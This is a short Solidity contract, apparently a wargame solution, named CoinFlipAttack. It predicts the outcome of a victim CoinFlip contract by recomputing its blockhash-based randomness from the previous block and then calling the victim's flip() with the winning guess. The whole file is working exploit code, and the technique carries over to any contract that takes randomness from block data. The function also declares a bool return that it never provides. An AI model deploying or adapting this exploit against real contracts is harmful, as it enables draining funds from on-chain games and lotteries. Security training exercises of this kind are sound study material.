//SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import './CoinFlip.sol';
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract CoinFlipAttack {
    using SafeMath for uint;
    CoinFlip public victimContract;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddress) public {
        victimContract = CoinFlip(_victimContractAddress);
    }

    function flip() public returns(bool) {
        uint blockValue = uint(blockhash(block.number.sub(1)));    // => block.number - 1
        uint coinFlip = blockValue.div(FACTOR); // blockValue / FACTOR
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
    }
}